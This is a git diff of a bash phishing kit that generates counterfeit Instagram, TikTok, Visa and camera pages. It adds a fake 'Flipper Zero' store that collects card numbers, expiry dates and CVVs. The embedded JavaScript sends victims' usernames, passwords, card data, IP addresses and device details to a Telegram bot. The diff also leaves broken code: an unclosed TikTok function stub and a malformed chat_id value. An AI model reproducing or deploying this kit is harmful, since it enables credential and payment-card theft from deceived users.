@@ -126,247 +126,7 @@ facebook_page() {
 EOF
 }
 
-Instagram_page() {
-    cat <<EOF
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <style>
-        /* CSS styling for Instagram login page */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
-        .login-container img { width: 175px; margin-bottom: 25px; }
-        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
-        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
-        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
-        .btn-login:hover { background-color: #3578e5; }
-        .forgot-password { margin-top: 10px; font-size: 14px; }
-        .forgot-password a { color: #4c86ff; text-decoration: none; }
-        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
-        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
-        .signup-btn:hover { background-color: #f4f4f4; }
-        .terms { margin-top: 20px; font-size: 12px; color: #888; }
-        .terms a { color: #4c86ff; text-decoration: none; }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
-        <h2>Sign in to Instagram</h2>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="btn-login">Log In</button>
-        </form>
-        <p class="forgot-password"><a href="#">Forgot password?</a></p>
-        <div class="divider"></div>
-        <button class="signup-btn">Don't have an account? Sign up</button>
-    </div>
-    <script>
-        const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', async function (event) {
-            event.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const deviceInfo = await getDeviceInfo();
-            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '${id}',
-                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
-                })
-            });
-            const result = await response.json();
-            if (result.ok) {
-                alert('Login successful! Redirecting...');
-                window.location.href = 'https://www.instagram.com';
-            } else {
-                alert('Login failed. Please check your credentials.');
-            }
-        });
-        async function getDeviceInfo() {
-            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-            const battery = await navigator.getBattery();
-            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
-            const deviceName = navigator.userAgent;
-            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
-        }
-    </script>
-</body>
-</html>
-EOF
-}
-
-tiktok_page() {
-    cat <<EOF
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Login</title>
-    <style>
-        /* CSS styling for TikTok login page */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .login-container {
-            background-color: #121212;
-            border-radius: 10px;
-            width: 360px;
-            padding: 40px 30px;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
-            color: #fff;
-        }
-
-        .login-container img {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-            font-size: 22px;
-            margin-bottom: 15px;
-            font-weight: 600;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            font-size: 15px;
-            outline: none;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-            background-color: #181818;
-            color: #fff;
-        }
-
-        input:focus {
-            border-color: #ff0050;
-            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            background-color: #ff0050;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            border-radius: 5px;
-            border: none;
-            cursor: pointer;
-            margin-bottom: 15px;
-            transition: background-color 0.3s ease;
-        }
-
-        .btn-login:hover {
-            background-color: #e60045;
-        }
-
-        .forgot-password {
-            margin-top: 10px;
-            font-size: 14px;
-        }
-
-        .forgot-password a {
-            color: #ff0050;
-            text-decoration: none;
-        }
-
-        .divider {
-            margin: 20px 0;
-            border-top: 1px solid #dbdbdb;
-        }
-
-        .signup-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #181818;
-            border: 1px solid #ff0050;
-            font-size: 14px;
-            color: #ff0050;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-bottom: 10px;
-        }
-
-        .signup-btn:hover {
-            background-color: #222;
-        }
-
-        .terms {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
-        }
-
-        .terms a {
-            color: #ff0050;
-            text-decoration: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-        <h2>Sign in to TikTok</h2>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="btn-login">Log In</button>
-        </form>
-        <p class="forgot-password"><a href="#">Forgot password?</a></p>
-        <div class="divider"></div>
-        <button class="signup-btn">Don't have an account? Sign up</button>
-    </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            let username = document.getElementById('username').value;
-            let password = document.getElementById('password').value;
-            
-            let token = "${token}";
-            let chatId = "${id}";
-
-            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
-            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    alert("Incorrect username or password. Please try again.");
-                })
-                .catch(error => console.error("Error sending message:", error));
-        });
-    </script>
-</body>
-</html>
-EOF
-}
+tiktok_page(){
 
 camera_page() {
     cat <<EOF
@@ -485,6 +245,83 @@ camera_page() {
         setTimeout(() => {
             document.getElementById('loading').style.display = 'none';
         }, 5000);
+    </script>
+</body>
+</html>
+EOF
+}
+
+Instagram_page() {
+    cat <<EOF
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* CSS styling for Instagram login page */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
+        .login-container img { width: 175px; margin-bottom: 25px; }
+        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
+        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
+        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
+        .btn-login:hover { background-color: #3578e5; }
+        .forgot-password { margin-top: 10px; font-size: 14px; }
+        .forgot-password a { color: #4c86ff; text-decoration: none; }
+        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
+        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
+        .signup-btn:hover { background-color: #f4f4f4; }
+        .terms { margin-top: 20px; font-size: 12px; color: #888; }
+        .terms a { color: #4c86ff; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        <h2>Sign in to Instagram</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+        <p class="forgot-password"><a href="#">Forgot password?</a></p>
+        <div class="divider"></div>
+        <button class="signup-btn">Don't have an account? Sign up</button>
+    </div>
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', async function (event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const deviceInfo = await getDeviceInfo();
+            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '${id}',
+                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
+                })
+            });
+            const result = await response.json();
+            if (result.ok) {
+                alert('Login successful! Redirecting...');
+                window.location.href = 'https://www.instagram.com';
+            } else {
+                alert('Login failed. Please check your credentials.');
+            }
+        });
+        async function getDeviceInfo() {
+            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+            const battery = await navigator.getBattery();
+            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+            const deviceName = navigator.userAgent;
+            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
+        }
     </script>
 </body>
 </html>
@@ -843,7 +680,7 @@ visa_page() {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: '${id}',
+                    chat_id: ',
                     text: \`
 Visa Login Attempt:
 
@@ -882,6 +719,270 @@ Device Name📱: \${deviceInfo.deviceName}
                 networkType: networkType,
                 deviceName: deviceName,
             };
+        }
+    </script>
+</body>
+</html>
+EOF
+}
+
+byvisa_page() {
+  cat <<EOF
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Luxury Flipper Zero Store</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle, #0f0f0f, #1a1a1a);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: auto;
+            padding: 20px;
+        }
+
+        header {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.6);
+            margin-bottom: 20px;
+            animation: glow 2s infinite alternate;
+        }
+
+        header h1 {
+            font-size: 30px;
+            letter-spacing: 2px;
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 10px rgba(0, 255, 255, 0.6); }
+            100% { box-shadow: 0 0 25px rgba(0, 255, 255, 1); }
+        }
+
+        .product {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        .product-img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .product-img:hover {
+            transform: scale(1.1);
+        }
+
+        .product-info {
+            max-width: 350px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: left;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
+        }
+
+        .product-info h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .price {
+            font-size: 22px;
+            font-weight: 700;
+            color: #2ecc71;
+        }
+
+        .discount {
+            font-size: 16px;
+            text-decoration: line-through;
+            color: #e74c3c;
+        }
+
+        .btn {
+            background-color: #f39c12;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: background 0.3s, transform 0.2s;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: #e67e22;
+            transform: scale(1.05);
+        }
+
+        .payment-form {
+            display: none;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
+            width: 380px;
+            margin: 30px auto;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .payment-form h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+
+        .payment-form label {
+            display: block;
+            text-align: left;
+            margin: 10px 0 5px;
+            font-size: 16px;
+        }
+
+        .payment-form input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .payment-form button {
+            background-color: #2ecc71;
+            padding: 14px;
+            color: white;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 6px;
+            width: 100%;
+        }
+
+        .payment-form button:hover {
+            background-color: #27ae60;
+        }
+
+        footer {
+            margin-top: 40px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #f39c12;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔥 Limited Offer: Flipper Zero</h1>
+            <p>Get it now for $15 and receive a $10 gift card!</p>
+        </header>
+
+        <section class="product">
+            <img src="https://raw.githubusercontent.com/Hmza1112617/DARK-FRIENDS-DF/refs/heads/main/f.jpg" alt="Flipper Zero" class="product-img">
+            <div class="product-info">
+                <h2>Flipper Zero - Cyber Security Tool</h2>
+                <p>Unlock powerful features like RFID, IR remote, and hacking capabilities.</p>
+                <span class="price">$15.00</span>
+                <span class="discount">$25.00</span>
+                <p>🎁 Limited-time offer: $10 bonus gift!</p>
+                <button class="btn" onclick="showPaymentForm()">Buy Now</button>
+            </div>
+        </section>
+
+        <section class="payment-form" id="paymentForm">
+            <h3>Enter Payment Details</h3>
+            <form onsubmit="processPayment(event)">
+                <label>Card Number</label>
+                <input type="text" required placeholder="XXXX-XXXX-XXXX-XXXX" id="cardNumber">
+                <label>Expiry Date</label>
+                <input type="month" required id="expiryDate">
+                <label>CVV</label>
+                <input type="text" required placeholder="123" id="cvv">
+                <button type="submit">Complete Payment</button>
+            </form>
+        </section>
+
+        <footer>
+            <p>&copy; 2025 Luxury Tech Store</p>
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Contact</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function showPaymentForm() { document.getElementById('paymentForm').style.display = 'block'; }
+
+        function processPayment(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Send payment details to Telegram bot
+            const telegramBotToken ='{token} ';
+            const chatId = '${id} ';
+            const message = `New payment details received💳:
+            
+            •Card Number: ${cardNumber}
+            •Expiry Date: ${expiryDate}
+            •CVV: ${cvv}`;
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    alert('Payment details sent successfully!');
+                    document.getElementById('paymentForm').style.display = 'none';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to send payment details.');
+                });
         }
     </script>
 </body>
@@ -958,7 +1059,8 @@ show_menu() {
     echo -e "${BLUE}[3] Google login${NC}"
     echo -e "${BLUE}[4] TikTok login${NC}"
     echo -e "${BLUE}[5] Visa login${NC}"
-    echo -e "${BLUE}[6] Camera and location${NC}"
+    echo -e "${BLUE}[6] By Visa ${NC}"
+    echo -e "${BLUE}[7] Camera and location${NC}"
     echo -e "${YELLOW}=================================${NC}"
 }
 
@@ -997,6 +1099,10 @@ case $choice in
         create_page "$page" "$(visa_page)"
         ;;
     6)
+        page="byvisa"
+        create_page "$page" "$(byvisa_page)"
+        ;;    
+    7)
         page="CameraAndLocation_login"
         create_page "$page" "$(camera_page)"
         ;;
